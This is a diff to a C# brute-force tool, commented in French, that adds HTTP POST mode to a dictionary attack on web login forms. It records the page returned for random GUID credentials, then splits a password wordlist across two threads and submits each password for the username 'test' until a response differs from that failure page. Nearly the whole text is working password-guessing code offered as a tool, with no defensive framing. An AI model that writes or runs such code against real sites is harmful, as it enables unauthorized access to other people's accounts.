@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Collections.Specialized;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -18,13 +19,15 @@ namespace bruteForce
         public string password = "";
         public string passwordRight = "";
         private string badRequest = "";
+        private string badRequestPost = "";
         private string finalRequest = "";
         private string[] allPassword;
         private FileStream fl;
         private int nbLine;
         private const int NB_THREAD = 2;
+        private bool methodGET = true;
 
-        public BruteForceHTTP(string _url, string _get,  string _get2,string _dicoPath)
+        public BruteForceHTTP(string _url, string _get, string _get2, string _dicoPath)
         {
             this.url = _url;
             this.getUsrename = _get;
@@ -39,8 +42,10 @@ namespace bruteForce
 
         }
 
-        public string findPassword()
+
+        public string findPassword(bool _methodGET)
         {
+            methodGET = _methodGET;
             //construire l'url avec des guid car c'est unique donc aucun user aura ce mdp et nom
             String _url = constructUrl(url, getUsrename, Guid.NewGuid().ToString(), getPassword, Guid.NewGuid().ToString());
             //lancer la requete
@@ -54,8 +59,21 @@ namespace bruteForce
             {
                 return @"/!\ Site Web Inaccessible /!\";
             }
-            //stocker la page avec connexion échouée
-            StreamReader sr = new StreamReader(reponse.GetResponseStream());
+
+            using (WebClient client = new WebClient())
+            {
+                byte[] response =
+                client.UploadValues(url, new NameValueCollection()
+                {
+                        { getUsrename, Guid.NewGuid().ToString() },
+                        { getPassword, Guid.NewGuid().ToString() }
+                });
+
+                badRequestPost = System.Text.Encoding.UTF8.GetString(response);
+
+            }
+                //stocker la page avec connexion échouée
+                StreamReader sr = new StreamReader(reponse.GetResponseStream());
             badRequest = sr.ReadToEnd();
 
             //lANCEMENT DES REQUETES EN MULTITHREAD
@@ -87,14 +105,29 @@ namespace bruteForce
         /// </summary>
         private void thread1Start()
         {
-            string find = "";
-            find = findPasswordThread(0);
-
-            //si le mdp est vide ce n'est pas le bon
-            if (find != "")
+            if (methodGET)
             {
-                //stocker le mot de passe si il est trouvé
-                passwordRight = find;
+                string find = "";
+                find = findPasswordThread(0);
+
+                //si le mdp est vide ce n'est pas le bon
+                if (find != "")
+                {
+                    //stocker le mot de passe si il est trouvé
+                    passwordRight = find;
+                }
+            }
+            else
+            {
+                string find = "";
+                find = findPasswordPOST(0);
+
+                //si le mdp est vide ce n'est pas le bon
+                if (find != "")
+                {
+                    //stocker le mot de passe si il est trouvé
+                    passwordRight = find;
+                }
             }
         }
 
@@ -103,6 +136,7 @@ namespace bruteForce
         /// </summary>
         private void thread2Start()
         {
+            if (methodGET) { 
             string find = "";
             find = findPasswordThread(1);
 
@@ -111,6 +145,19 @@ namespace bruteForce
             {
                 //stocker le mot de passe si il est trouvé
                 passwordRight = find;
+            }
+            }
+            else
+            {
+                string find = "";
+                find = findPasswordPOST(1);
+
+                //si le mdp est vide ce n'est pas le bon
+                if (find != "")
+                {
+                    //stocker le mot de passe si il est trouvé
+                    passwordRight = find;
+                }
             }
         }
 
@@ -131,19 +178,19 @@ namespace bruteForce
             string _url;
             //reponse de la requete
             StreamReader sr;
-            
+
             //diviser le dictionaire et tester si le mot de passe est corrrect
-            for (int i = nbLine/NB_THREAD*iStart; i < nbLine/NB_THREAD+ nbLine / NB_THREAD * iStart; i++)
+            for (int i = nbLine / NB_THREAD * iStart; i < nbLine / NB_THREAD + nbLine / NB_THREAD * iStart; i++)
             {
-                    //construction de l'url avec le mot de passe dedans
-                    _url = constructUrl(url, getUsrename, "test", getPassword, allPassword[i]);
-                    //lancer la requete
-                    request = WebRequest.Create(_url);
-                    reponse = (HttpWebResponse)request.GetResponse();
-                    //stocker le résultat
-                    sr = new StreamReader(reponse.GetResponseStream());
-                    finalRequest = sr.ReadToEnd();
-                
+                //construction de l'url avec le mot de passe dedans
+                _url = constructUrl(url, getUsrename, "test", getPassword, allPassword[i]);
+                //lancer la requete
+                request = WebRequest.Create(_url);
+                reponse = (HttpWebResponse)request.GetResponse();
+                //stocker le résultat
+                sr = new StreamReader(reponse.GetResponseStream());
+                finalRequest = sr.ReadToEnd();
+
                 //comparer la page si elle est similaire à celle d'erreur
                 if (finalRequest != badRequest)
                 {
@@ -154,6 +201,36 @@ namespace bruteForce
             //retourner si le mot de passse n'est pas trouvé
             return passwordThread;
 
+        }
+
+        public string findPasswordPOST(int iStart)
+        {
+            string passwordToReturn = "";
+            using (WebClient client = new WebClient())
+            {
+                //diviser le dictionaire et tester si le mot de passe est corrrect
+                for (int i = nbLine / NB_THREAD * iStart; i < nbLine / NB_THREAD + nbLine / NB_THREAD * iStart; i++)
+                {
+                    byte[] response =
+                client.UploadValues(url, new NameValueCollection()
+                {
+                        { getUsrename, "test" },
+                        { getPassword, allPassword[i] }
+                });
+
+                    string result = System.Text.Encoding.UTF8.GetString(response);
+
+                    //comparer la page si elle est similaire à celle d'erreur
+                    if (result != badRequestPost)
+                    {
+                        //retourner le mot de passe trouvé
+                        return allPassword[i];
+                    }
+
+                }
+            }
+
+            return passwordToReturn;
         }
 
 
